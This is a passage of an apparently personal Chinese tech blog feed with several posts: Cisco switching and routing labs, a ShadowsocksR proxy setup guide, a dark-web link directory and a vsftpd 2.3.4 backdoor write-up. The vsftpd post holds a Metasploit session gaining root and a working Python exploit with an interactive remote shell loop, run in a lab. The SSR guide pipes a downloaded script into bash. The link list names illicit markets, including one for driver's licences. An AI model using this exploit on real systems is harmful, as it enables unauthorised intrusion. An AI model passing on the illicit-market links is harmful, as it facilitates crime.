id="PVST-配置命令"><a href="#PVST-配置命令" class="headerlink" title="PVST+配置命令"></a>PVST+配置命令</h1><h4 id="步骤一：启用生成树命令"><a href="#步骤一：启用生成树命令" class="headerlink" title="步骤一：启用生成树命令"></a>步骤一：启用生成树命令</h4><pre><code class="shell">spanning-tree vlan 2   //全局模式下配置</code></pre><h4 id="步骤二：指定根网桥"><a href="#步骤二：指定根网桥" class="headerlink" title="步骤二：指定根网桥"></a>步骤二：指定根网桥</h4><pre><code class="shell">spanning-tree vlan 1 priority   优先级的值   //全局配置模式下配置//注意：优先级的值是4096的倍数</code></pre><h4 id="步骤三：查看生成树的配置"><a href="#步骤三：查看生成树的配置" class="headerlink" title="步骤三：查看生成树的配置"></a>步骤三：查看生成树的配置</h4><pre><code class="shell">show spanning-tree vlan 1 </code></pre><h4 id="步骤四：直接指定"><a href="#步骤四：直接指定" class="headerlink" title="步骤四：直接指定"></a>步骤四：直接指定</h4><pre><code class="shell">spanning-tree vlan 1 root primary/secondary</code></pre><blockquote><p>注意：如果优先级的值都为默认值，配置primary，优先级使24576，配置secondary,优先级使28672，如果已经手动修改优先级的值则配置primary优先级会整体环境调整速端口使连接的终端快速进入到转发的状态改端口不经过侦听和学习状态，直接进入转发状态，节省30秒的转发延迟。速端口只能配置在连接终端的端口上；</p></blockquote><ul><li><p>配置速端口</p><pre><code class="shell">spanning-tree portfast    //接口模式</code></pre></li><li><p>查看某个VLAN的生成树信息</p><pre><code class="shell">show spanning-tree vlan 2 detail     //特权模式</code></pre><p><img src="https://s3.ax1x.com/2021/02/12/yDRlwj.png"></p></li></ul></li></ul></li></ol><h1 id="实验一：快速生成树协议"><a href="#实验一：快速生成树协议" class="headerlink" title="实验一：快速生成树协议"></a>实验一：快速生成树协议</h1><p><img src="https://s3.ax1x.com/2021/02/12/yDRwm4.png"></p><p><img src="https://s3.ax1x.com/2021/02/12/yDRrkR.png"></p><h4 id="步骤一：第一台交换机的配置与第二台交换机的配置同理"><a href="#步骤一：第一台交换机的配置与第二台交换机的配置同理" class="headerlink" title="步骤一：第一台交换机的配置与第二台交换机的配置同理"></a>步骤一：第一台交换机的配置与第二台交换机的配置同理</h4><pre><code class="shell">Switch&gt;enSwitch#conf tSwitch(config)#vlan 10Switch(config-vlan)#exitSwitch(config)#inter fa 0/10 //将fa 0/10 端口绑定到 vlan10Switch(config-if)#switchport access vlan 10Switch(config-if)#exitSwitch(config)#inter rang fa 0/1 - 2Switch(config-range)#switchport mode trunk //将 fa0/1 fa0/2端口工作模式改为 trunkSwitch(config-range)#exitSwitch(config)#spanning-tree mode rapid-pvst //指定生成树协议的类型为RSTPSwitch(config)#end</code></pre><h4 id="步骤二：第二台交换机的配置"><a href="#步骤二：第二台交换机的配置" class="headerlink" title="步骤二：第二台交换机的配置"></a>步骤二：第二台交换机的配置</h4><pre><code class="shell">Switch&gt;enSwitch#conf tSwitch(config)#int fa 0/1Switch(config-if)#shutdown //关闭fa 0/1端口</code></pre><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><blockquote><p>如果先连线在配置就会造成广播风暴，影响交换的正常工作；</p><p>两台交换机都配置完生成树协议之后，再将两台交换机连接起来；</p></blockquote><ul><li>未完待续…</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程师 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>科学上网-SSR搭建</title>
      <link href="2021/02/12/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-SSR%E6%90%AD%E5%BB%BA/"/>
      <url>2021/02/12/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-SSR%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="一：SSR简介"><a href="#一：SSR简介" class="headerlink" title="一：SSR简介"></a>一：SSR简介</h1><blockquote><p>ShadowsocksR（简称 SSR）是 Shadowsocks 分支，在 Shadowsocks(简称 SS)的基础上增加了一些数据混淆方式，称修复了部分安全问题并可以提高 QoS 优先级。甚至增加了类似 Tor 的可插拔传输层功能。</p></blockquote><h1 id="二：环境部署"><a href="#二：环境部署" class="headerlink" title="二：环境部署"></a>二：环境部署</h1><h4 id="步骤一：用户注册与购买"><a href="#步骤一：用户注册与购买" class="headerlink" title="步骤一：用户注册与购买"></a>步骤一：用户注册与购买</h4><blockquote><p>云主机购买地址：<a href="https://my.vultr.com/">https://my.vultr.com/</a></p></blockquote><h4 id="步骤二：云主机部署"><a href="#步骤二：云主机部署" class="headerlink" title="步骤二：云主机部署"></a>步骤二：云主机部署</h4><ol><li><p>进入主控制界面，侧边栏选择Products–&gt;点击Deploy Instance按钮开始部署</p></li><li><p>在Choose Server–&gt;选择Cloud Compute</p></li><li><p>在Server Location–&gt;Tokyo</p></li><li><p>在Server Type–&gt;Centos 7 x64</p></li><li><p>在Server Size–&gt;$5/mo</p></li><li><p>点击Deploy Now</p></li></ol><h4 id="步骤三：远程主机连接"><a href="#步骤三：远程主机连接" class="headerlink" title="步骤三：远程主机连接"></a>步骤三：远程主机连接</h4><ul><li>使用工具：<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">Putty</a></li></ul><ol><li><p>进入主机控制台可查看主机详细信息</p></li><li><p>进入CMD使用命令,进行登录</p><pre><code class="shell">ssh root@x.x.x.x</code></pre></li></ol><h1 id="三：SSR节点搭建"><a href="#三：SSR节点搭建" class="headerlink" title="三：SSR节点搭建"></a>三：SSR节点搭建</h1><h4 id="步骤一：环境准备"><a href="#步骤一：环境准备" class="headerlink" title="步骤一：环境准备"></a>步骤一：环境准备</h4><ul><li><p><strong>shadowsocksR</strong> 一键部署脚本</p><pre><code class="shell">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssrmu.sh &amp;&amp; chmod +x ssrmu.sh &amp;&amp; bash ssrmu.sh</code></pre></li><li><p>SSR客户端软件</p><blockquote><p>SSTap 是 SocksCap64 作者新开发的一款利用虚拟网卡实现的网络层代理。SSTap 能在网络层拦截所有连接并转发给 HTTP，SOCKS4，5，SHADOWSOCKS 代理.而无需对被代理的应用程序做任何修改或设置。它能同时转发 TCP, UDP 数据包。它非常适合于游戏玩家使用。享受你的游戏时光！请使用SSTap！</p></blockquote><pre><code class="http">链接：https://pan.baidu.com/s/1L-lEa39CTmgf5x0umKPjXQ 提取码：laos 复制这段内容后打开百度网盘手机App，操作更方便哦</code></pre></li></ul><h4 id="步骤二：SSR部署"><a href="#步骤二：SSR部署" class="headerlink" title="步骤二：SSR部署"></a>步骤二：SSR部署</h4><ol><li>复制ShadowsocksR一键部署脚本到VPS主机终端</li><li>输入1：安装ShadowsocksR</li><li>IP或域名设置为默认</li><li>设置连接用户名  例：laosec</li><li>设置连接端口号  例：12321</li><li>设置连接密码      例：laosecurity</li><li>设置用户加密方式为aes-256-ctr</li><li>设置协议插件为auth_aes_128_sha1</li><li>设置混淆插件默认plain</li><li>其余设置默认即可，开始安装</li><li>安装完后会显示该SSR节点的相关配置信息</li></ol><h4 id="步骤三：建立SSR节点连接"><a href="#步骤三：建立SSR节点连接" class="headerlink" title="步骤三：建立SSR节点连接"></a>步骤三：建立SSR节点连接</h4><ol><li><p>在SSTAP中添加SSR节点信息，点击加号–&gt;添加SS/SSR代理</p></li><li><p>将SSR节点信息填入，并店家闪电按钮来进行测速</p><h4 id="步骤四：连接测试"><a href="#步骤四：连接测试" class="headerlink" title="步骤四：连接测试"></a>步骤四：连接测试</h4><ol><li>百度直接搜索IP即可查看</li><li><a href="https://www.ip138.com/">https://www.ip138.com/</a>   </li></ol><h1 id="四：免费SSR节点"><a href="#四：免费SSR节点" class="headerlink" title="四：免费SSR节点"></a>四：免费SSR节点</h1><pre><code class="http">https://lncn.org/   //1-2天更新一次https://raw.githubusercontent.com/ssrsub/ssr/master/ssrsub  //需要base64解密http://ss.pythonic.life/      //待验证</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 服务器运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>暗网-地址大全</title>
      <link href="2021/01/29/%E6%9A%97%E7%BD%91-%E5%9C%B0%E5%9D%80%E5%A4%A7%E5%85%A8/"/>
      <url>2021/01/29/%E6%9A%97%E7%BD%91-%E5%9C%B0%E5%9D%80%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Tor-Browser"><a href="#Tor-Browser" class="headerlink" title="Tor Browser"></a>Tor Browser</h1><h4 id="浏览器特性："><a href="#浏览器特性：" class="headerlink" title="浏览器特性："></a>浏览器特性：</h4><blockquote><ul><li><p>屏蔽追踪者</p><p>Tor 浏览器隔离了你访问的每个网站，因此第三方跟踪器和广告无法追踪你。浏览结束后，任何 cookies 都会被自动清除。你的浏览记录也是如此。</p></li><li><p>防范监视<br>Tor 浏览器可以阻止他人通过查看您的连接来了解您访问的网站。监控您浏览习惯的所有人最多只能看到您正在使用 Tor。</p></li><li><p>防指纹追踪<br>Tor 浏览器旨在让所有用户看起来都相同，使得很难根据您的浏览器和设备信息进行指纹识别。</p></li><li><p>多层加密<br>当您的流量通过 Tor 网络时，您的流量会被中继和加密三次。 该网络由数千个志愿者运行的服务器组成，称为 Tor 中继。</p></li></ul></blockquote><pre><code class="http">https://www.torproject.org/zh-CN/download/   //官方默认语言https://www.torproject.org/zh-CN/download/languages/   //其他语言选择</code></pre><h1 id="暗网地址"><a href="#暗网地址" class="headerlink" title="暗网地址"></a>暗网地址</h1><ul><li><p>搜索引擎及导航</p><pre><code class="http">http://underdiriled6lvdfgiw4e5urfofuslnz7ewictzf76h4qb73fxbsxad.onion/  //暗网导航https://hiddenwikitor.com/      //暗网搜索https://darksearch.io/          //暗网搜索https://ahmia.fi/               //暗网搜搜https://www.hyperiongray.com/   //暗网地图https://www.deeponionweb.com/   //暗网地图https://www.deepwebsiteslinks.com/  //暗网链接网页https://onionlandsearchengine.com/  //洋葱站点搜索https://onionsearchengine.com   //洋葱搜索引擎http://msydqstlz2kzerdg.onion/  //暗网地址查http://oniot2zvfczp4lpc.onion   //暗网访问排名https://iaca-darkweb-tools.com/socialmedia/      //暗网社交媒体https://iaca-darkweb-tools.com/marketplaces/     //市场/论坛https://iaca-darkweb-tools.com/search-darkweb/   //暗网搜索工具http://hdwikivgmzfa5eui.onion/#Chinese_.2F_.E4.B8.AD.E5.9B.BD.E8.AA.9E   //各个国家论坛http://torlinkbgs6aabns.onion/  //Tor的暗网之家......</code></pre></li><li><p>交易市场</p><pre><code class="http">http://bmp3qqimv55xdznb.onion/index.php    //中文暗网https://dnstats.net/           //市场/新闻https://www.hunch.ly/darkweb-osint/        //暗网每日简报http://silkroadxjzvoyxh.onion/?road        //丝绸之路 4http://foggeddriztrcar2.onion/             //比特币交易http://xbtppbb7oz5j2stohmxzvkprpqw5dwmhhhdo2ygv6c7cs4u46ysufjyd.onion/login  //暗网自由城http://7zj4oshsyhokgus6fyk7pmdiubu4mkjpjjprjkvopnhnwylr522tymqd.onion/user/login  //茶马古道http://en35tuzqmn4lofbk.onion/             //各国驾照......</code></pre></li><li><p>自由</p><pre><code class="http">https://www.facebookcorewwwi.onion/        //暗网版Facebookhttp://pncldyerk4gqofhp.onion/free/index   //自由国度http://vfgop7uag7dpxuxq.onion/             //一堆草https://github.com/DedSecInside/TorBot     //暗网调查工具......</code></pre></li><li><p>后续更新……</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 总结与分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安全开发-Vsftpd2.3.4后门利用脚本编写</title>
      <link href="2021/01/29/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-Vsftpd2-3-4%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
      <url>2021/01/29/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-Vsftpd2-3-4%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="一：漏洞起源"><a href="#一：漏洞起源" class="headerlink" title="一：漏洞起源"></a>一：漏洞起源</h2><p><img src="https://s3.ax1x.com/2021/01/29/yinSw8.png"></p><h2 id="二：手动利用"><a href="#二：手动利用" class="headerlink" title="二：手动利用"></a>二：手动利用</h2><h4 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h4><table><thead><tr><th align="center">定位</th><th align="center">环境</th><th align="center">IP Address</th></tr></thead><tbody><tr><td align="center">攻击机</td><td align="center">Python3.8</td><td align="center">192.168.31.33</td></tr><tr><td align="center">靶机</td><td align="center">Metasploitable2</td><td align="center">192.168.31.20</td></tr></tbody></table><h4 id="步骤一：FTP登录"><a href="#步骤一：FTP登录" class="headerlink" title="步骤一：FTP登录"></a>步骤一：FTP登录</h4><blockquote><p>使用用户名+:)来进行用户登录，密码随便填写，连接上后会开启后门侦听6200端口来等待命令连接</p></blockquote><p><img src="https://s3.ax1x.com/2021/01/29/yiKiMn.png"></p><h4 id="步骤二：Python脚本发送命令"><a href="#步骤二：Python脚本发送命令" class="headerlink" title="步骤二：Python脚本发送命令"></a>步骤二：Python脚本发送命令</h4><pre><code class="python">import socket                  #导入socket库ip = "192.168.31.33"           port = 6200s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((ip, 6200))         #对目标建立socket连接s.settimeout(1.5)     host = str.encode('id -u -n' + '\n')  #执行id命令查询当前用户身份信息s.send(host)                          #发送命令hostt = s.recv(1024).decode('utf-8')  #接受命令print(hostt)                          #打印命令执行结果</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yiMm0P.png"></p><h2 id="三：MSF攻击"><a href="#三：MSF攻击" class="headerlink" title="三：MSF攻击"></a>三：MSF攻击</h2><pre><code class="xaml">msf6 &gt; search vsftpdMatching Modules================   #  Name                                  Disclosure Date  Rank       Check  Description   -  ----                                  ---------------  ----       -----  -----------   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command ExecutionInteract with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoormsf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor[*] No payload configured, defaulting to cmd/unix/interactmsf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 192.168.31.33RHOSTS =&gt; 192.168.31.33msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit[*] 192.168.31.33:21 - Banner: 220 (vsFTPd 2.3.4)[*] 192.168.31.33:21 - USER: 331 Please specify the password.[+] 192.168.31.33:21 - Backdoor service has been spawned, handling...[+] 192.168.31.33:21 - UID: uid=0(root) gid=0(root)[*] Found shell.[*] Command shell session 1 opened (0.0.0.0:0 -&gt; 192.168.31.33:6200) at 2021-01-29 17:28:46 +0800whoamiroot</code></pre><h2 id="四：攻击脚本编写"><a href="#四：攻击脚本编写" class="headerlink" title="四：攻击脚本编写"></a>四：攻击脚本编写</h2><pre><code class="python">import socket    #网络编程    import time      #处理时间import sys       #接受参数   def exploit(ip, port):    try:        ftp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            ftp.connect((ip, port))                 #对目标IP地址及端口进行连接        check = ftp.recv(1024).decode('utf-8')  #接受返回来的数据并对其进行解码操作        socket.setdefaulttimeout(5)             #设置请求超时时间        if "vsftpd 2.3.4" in check.lower():     #检测banner信息中是否存在漏洞信息            ftp.send(b'USER letmein:)\n')       #发送攻击数据，记住笑脸            ftp.send(b'PASS invaild\n')         #发送攻击数据            time.sleep(2)                       #等待2秒钟时间            ftp.close()                         #关闭连接            print("[+] SUCCESSFUL CONNECTİON")        else:            print("[-] Not work vsftpd 2.3.4")    except Exception as f:                      #异常信息给到变量f        print('[-] CONNECTION FAILED')        print(f)                                #打印异常信息        ftp.close()                             #关闭连接        sys.exit(1)                             #退出程序并返回1    try:        arkakapi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     #调用socket库        arkakapi.connect((ip, 6200))                                     #对目标IP地址及端口进行连接        arkakapi.setdefaulttimeout(1.5)                                  #设置请求超时时间为1.5秒        print('[*] SESSION CREATED')          print('[!] Interactive shell to check &gt;&gt; use command shell_check')        host = str.encode('id -u -n' + '\n')                             #漏洞验证                                   arkakapi.send(host)                                              #发送命令        hostt = arkakapi.recv(1024).decode('utf-8')                      #打印输出当前用户信息        while True:            sendnude = input(ip + '@' + str(hostt.strip()) + "#: ")      #接受用户输入要执行的命令            if sendnude.lower() == 'shell_check':                        #shell终端检测                print('[*]Interactıve shell checked...')                komut = str.encode((tty + '\n'))                arkakapi.send(komut)                print(arkakapi.recv(1024).decode('utf-8'))            else:                try:                    komut = str.encode((sendnude + '\n'))              #将输入的命令添加换行操作在进行UTF-8编码                    arkakapi.send(komut)                               #发送要执行的命令                    responseq = arkakapi.recv(1024).decode('utf-8')    #接受并解码放回来的数据                    print(responseq)                                   #打印命令执行结果                except socket.timeout:                    pass            if sendnude.lower() == 'exit':                             #shell中判断退出                print('[*] SESSION CLOSED')                arkakapi.close()                sys.exit(1)    except Exception as f:                                             #异常处理        print('[!] Failed to connect to backdoor')        print(f)if __name__ == '__main__':     # 判断python脚本是否是独立执行    if len(sys.argv) &lt; 3:      # 脚本参数数量判断        print('Usage ./VSFTPexp.py &lt;İP&gt; &lt;PORT&gt;')        print('Example ./VSFTPexp.py 127.0.0.1 21')        else:        exploit(sys.argv[1], int(sys.argv[2]))   #函数使用  第一个参数传递进入字符串类型  第二个参数传递进入为类型转换后的整型</code></pre><h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img src="https://s3.ax1x.com/2021/01/29/yilZIf.png"></p><ul><li><a href="https://github.com/ahervias77/vsftpd-2.3.4-exploit">代码参考</a></li><li>未完待续…</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python专题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cisco-单臂与动态路由</title>
      <link href="2021/01/29/Cisco-%E5%8D%95%E8%87%82%E4%B8%8E%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1/"/>
      <url>2021/01/29/Cisco-%E5%8D%95%E8%87%82%E4%B8%8E%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1/</url>
      
        <content type="html"><![CDATA[<h2 id="一：单臂路由"><a href="#一：单臂路由" class="headerlink" title="一：单臂路由"></a>一：单臂路由</h2><blockquote><p>实现不同vlan之间的通信</p></blockquote><h4 id="子接口"><a href="#子接口" class="headerlink" title="子接口"></a>子接口</h4><blockquote><p>路由器的物理接口可以被划分成多个逻辑接口，每个子接口对应一个vlan网关</p></blockquote><h4 id="vlan标签的封装结构"><a href="#vlan标签的封装结构" class="headerlink" title="vlan标签的封装结构"></a>vlan标签的封装结构</h4><pre><code class="xaml">encapsulation dot1q 2</code></pre><h4 id="单臂路由的缺陷"><a href="#单臂路由的缺陷" class="headerlink" title="单臂路由的缺陷"></a>单臂路由的缺陷</h4><blockquote><p>单臂路由容易形成网络瓶颈，子接口依托物理接口，应用不灵活；vlan之间需要转发查看路由表，严重浪费设备资源</p></blockquote><h2 id="二：三层交换技术"><a href="#二：三层交换技术" class="headerlink" title="二：三层交换技术"></a>二：三层交换技术</h2><blockquote><p>使用三层交换机技术实现vlan之间通信   三层交换等于二层交换+三层转发</p></blockquote><h4 id="基于CEF的快速转发"><a href="#基于CEF的快速转发" class="headerlink" title="基于CEF的快速转发"></a>基于CEF的快速转发</h4><p>主要包含两个转发用的信息表</p><ul><li>转发信息库（FIB）：FIB类似于路由表包含路由表中转发的信息镜像，当网络的拓扑发生变换时，路由表将被更新，而FIB也将随之发生变化</li><li>邻接关系表：每个FIB条目，邻接关系表中包含相应的第二层地址</li><li>虚拟接口（SVI）三层交换机上的配置的VLAN接口为虚接口</li></ul><h4 id="三层交换机之间的配置"><a href="#三层交换机之间的配置" class="headerlink" title="三层交换机之间的配置"></a>三层交换机之间的配置</h4><ul><li><p>在三层交换机上开启路由功能</p><pre><code class="xaml">ip routing   //在全局模式下使用此命令</code></pre></li><li><p>配置虚拟接口的IP地址</p><pre><code class="xaml">interface vlan 2ip address 192.168.2.1 255.255.255.0no shutdown </code></pre></li><li><p>在三层交换机上的配置Trunk并执行接口封装为802.1q</p><pre><code class="xaml">switchport trunk encapsulation dot1qswitchport mode trunk</code></pre></li><li><p>配置路由接口</p><pre><code class="xaml">no swithcport    //接口模式下启用</code></pre></li></ul><h2 id="三：动态路由"><a href="#三：动态路由" class="headerlink" title="三：动态路由"></a>三：动态路由</h2><blockquote><p>特点：减少管理任务  占用了网络的带宽</p></blockquote><h4 id="按照路由执行的算法动态路由协议分类"><a href="#按照路由执行的算法动态路由协议分类" class="headerlink" title="按照路由执行的算法动态路由协议分类"></a>按照路由执行的算法动态路由协议分类</h4><ul><li>距离矢量路由协议  依据从源网络到目标网络所经过的路由器的个数新选择路由 RIP/IGRP</li><li>链路状态路由协议  综合考虑从源网络到目标网络的各条路径的情况选择路由  OSPF、is-is</li></ul><h4 id="RIP路由协议"><a href="#RIP路由协议" class="headerlink" title="RIP路由协议"></a>RIP路由协议</h4><ul><li>RIP是距离矢量路由选择协议</li><li>RIP的度量值为跳数，最大条数为15跳，16跳为不可达</li><li>RIP更新时间，每隔30S发送路由更新消息，UDP 520 端口</li><li>RIP路由跟新消息，发送整个路由表信息</li></ul><h4 id="RIP-V1和RIP-V2区别"><a href="#RIP-V1和RIP-V2区别" class="headerlink" title="RIP V1和RIP V2区别"></a>RIP V1和RIP V2区别</h4><table><thead><tr><th align="center">RIP V1</th><th align="center">RIP V2</th></tr></thead><tbody><tr><td align="center">有类路由协议</td><td align="center">无类路由协议</td></tr><tr><td align="center">广播更新（255.255.255.255）</td><td align="center">组播更新（224.0.0.9）</td></tr><tr><td align="center">不支持VLSM</td><td align="center">支持VLSM</td></tr><tr><td align="center">自动路由汇总，不可关闭</td><td align="center">自动汇总可关闭，可手工汇总</td></tr><tr><td align="center">更新的过程中不携带子网信息</td><td align="center">更新的过程携带子网信息</td></tr></tbody></table><h4 id="RIP-V2配置"><a href="#RIP-V2配置" class="headerlink" title="RIP V2配置"></a>RIP V2配置</h4><pre><code class="xaml">router rip   //全局配置模式下开启version 2      //使用RIP V2no auto-auymmary    //关闭路由汇总network  主网络ID</code></pre><h2 id="实验一：单臂路由实验"><a href="#实验一：单臂路由实验" class="headerlink" title="实验一：单臂路由实验"></a>实验一：单臂路由实验</h2><p><img src="https://s3.ax1x.com/2021/01/29/yPicbd.png"></p><pre><code class="xaml">Switch&gt;enableSwitch#Switch#vlan database% Warning: It is recommended to configure VLAN from config mode,as VLAN database mode is being deprecated. Please consult userdocumentation for configuring VTP/VLAN in config mode.Switch(vlan)#Switch(vlan)#vlan 2 name otherVLAN 2 added:Name: otherSwitch(vlan)#Switch(vlan)#exitAPPLY completed.Exiting....Switch#Switch#configConfiguring from terminal, memory, or network [terminal]?Enter configuration commands, one per line. End with CNTL/Z.Switch(config)#Switch(config)#interface f0/3Switch(config-if)#switchport access vlan 2Switch(config-if)#exitSwitch(config)#Switch(config)#interface f0/1Switch(config-if)#switchport mode trunk</code></pre><pre><code class="xaml">Router&gt;enableRouter#Router#configConfiguring from terminal, memory, or network [terminal]?Enter configuration commands, one per line. End with CNTL/Z.Router(config)#Router(config)#interface g0/0Router(config-if)#Router(config-if)#Router(config-if)#no shutdownRouter(config-if)#%LINK-5-CHANGED: Interface GigabitEthernet0/0, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0, changed state to upRouter(config-if)#Router(config-if)#Router(config-if)#exitRouter(config)#Router(config)#interface g0/0.1Router(config-subif)#%LINK-5-CHANGED: Interface GigabitEthernet0/0.1, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0.1, changed state to upRouter(config-subif)#encapRouter(config-subif)#encapsulation dotRouter(config-subif)#encapsulation dot1Q 1Router(config-subif)#ip address 192.168.1.1 255.255.255.0Router(config-subif)#no shutdownRouter(config-subif)#Router(config-subif)#Router(config-subif)#exitRouter(config)#Router(config)#Router(config)#Router(config)#interface g0/0.2Router(config-subif)#%LINK-5-CHANGED: Interface GigabitEthernet0/0.2, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0.2, changed state to upRouter(config-subif)#encaRouter(config-subif)#encapsulation doRouter(config-subif)#encapsulation dot1Q 2Router(config-subif)#ip address 192.168,2.1 255.255.255.0^% Invalid input detected at '^' marker.Router(config-subif)#ip address 192.168.2.1 255.255.255.0Router(config-subif)#no shutdownRouter(config-subif)#Router(config-subif)#exit</code></pre><h2 id="实验二：配置RIP"><a href="#实验二：配置RIP" class="headerlink" title="实验二：配置RIP"></a>实验二：配置RIP</h2><p><img src="https://s3.ax1x.com/2021/01/29/yPirvD.png"></p><p><img src="https://s3.ax1x.com/2021/01/29/yPi48f.png"></p><pre><code class="xaml">Router&gt;enableRouter#configConfiguring from terminal, memory, or network [terminal]?Enter configuration commands, one per line. End with CNTL/Z.Router(config)#Router(config)#interface g0/0Router(config-if)#Router(config-if)#ip address 192.168.1.1 255.255.255.0Router(config-if)#Router(config-if)#no shutdownRouter(config-if)#%LINK-5-CHANGED: Interface GigabitEthernet0/0, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0, changed state to upRouter(config-if)#Router(config-if)#exitRouter(config)#Router(config)#Router(config)#interface g0/1Router(config-if)#ip address 192.168.2.1 255.255.255.0Router(config-if)#Router(config-if)#no shtudown^% Invalid input detected at '^' marker.Router(config-if)#Router(config-if)#no shutdownRouter(config-if)#%LINK-5-CHANGED: Interface GigabitEthernet0/1, changed state to upRouter(config-if)#Router(config-if)#exitRouter(config)#%LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/1, changed state to upRouter(config)#Router(config)#router tip^Router(config)#router ripRouter(config-router)#version 2Router(config-router)#no auRouter(config-router)#no auto-summaryRouter(config-router)#network 192.168.1.0Router(config-router)#network 192.168.2.0Router(config-router)#exitRouter(config)#</code></pre><pre><code class="xaml">Router&gt;enableRouter#Router#configConfiguring from terminal, memory, or network [terminal]?Enter configuration commands, one per line. End with CNTL/Z.Router(config)#interface g0/0Router(config-if)#Router(config-if)#ip address 192.168.3.1 255.255.255.0Router(config-if)#no shutdownRouter(config-if)#%LINK-5-CHANGED: Interface GigabitEthernet0/0, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0, changed state to upRouter(config-if)#Router(config-if)#exitRouter(config)#Router(config)#interface g0/1Router(config-if)#Router(config-if)#ip address 192.168.2.2 255.255.255.0Router(config-if)#no shtudown^% Invalid input detected at '^' marker.Router(config-if)#Router(config-if)#no shutdownRouter(config-if)#%LINK-5-CHANGED: Interface GigabitEthernet0/1, changed state to up%LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/1, changed state to upRouter(config-if)#Router(config-if)#exitRouter(config)#Router(config)#router ripRouter(config-router)#version 2Router(config-router)#no auto-summaryRouter(config-router)#network 192.168.2.0Router(config-router)#network 192.168.3.0Router(config-router)#Router(config-router)#exitRouter(config)#Router#%SYS-5-CONFIG_I: Configured from console by consoleRouter#show ip routeCodes: L - local, C - connected, S - static, R - RIP, M - mobile, B - BGPD - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter areaN1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGPi - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area* - candidate default, U - per-user static route, o - ODRP - periodic downloaded static routeGateway of last resort is not setR 192.168.1.0/24 [120/1] via 192.168.2.1, 00:00:25, GigabitEthernet0/1192.168.2.0/24 is variably subnetted, 2 subnets, 2 masksC 192.168.2.0/24 is directly connected, GigabitEthernet0/1L 192.168.2.2/32 is directly connected, GigabitEthernet0/1192.168.3.0/24 is variably subnetted, 2 subnets, 2 masksC 192.168.3.0/24 is directly connected, GigabitEthernet0/0L 192.168.3.1/32 is directly connected, GigabitEthernet0/0</code></pre><h2 id="实验三：三层交换机做单臂路由"><a href="#实验三：三层交换机做单臂路由" class="headerlink" title="实验三：三层交换机做单臂路由"></a>实验三：三层交换机做单臂路由</h2><p><img src="https://s3.ax1x.com/2021/01/29/yPF9r4.png"></p><pre><code class="xaml">Switch#show runBuilding configuration...Current configuration : 1380 bytes!version 12.2no service timestamps log datetime msecno service timestamps debug datetime msecno service password-encryption!hostname Switch!ip routing!spanning-tree mode pvst!interface FastEthernet0/1switchport trunk encapsulation dot1qswitchport mode trunk!interface FastEthernet0/2!interface FastEthernet0/3!interface FastEthernet0/4!interface FastEthernet0/5!interface FastEthernet0/6!interface FastEthernet0/7!interface FastEthernet0/8!interface FastEthernet0/9!interface FastEthernet0/10!interface FastEthernet0/11!interface FastEthernet0/12!interface FastEthernet0/13!interface FastEthernet0/14!interface FastEthernet0/15!interface FastEthernet0/16!interface FastEthernet0/17!interface FastEthernet0/18!interface FastEthernet0/19!interface FastEthernet0/20!interface FastEthernet0/21!interface FastEthernet0/22!interface FastEthernet0/23!interface FastEthernet0/24!interface GigabitEthernet0/1!interface GigabitEthernet0/2!interface Vlan1ip address 192.168.1.1 255.255.255.0!interface Vlan2mac-address 0007.ec27.3a01ip address 192.168.2.1 255.255.255.0!interface Vlan3mac-address 0007.ec27.3a02ip address 192.168.3.1 255.255.255.0!ip classless!ip flow-export version 9!line con 0!line aux 0!line vty 0 4login!end</code></pre><blockquote><p>注意：interface vlan vlan-id 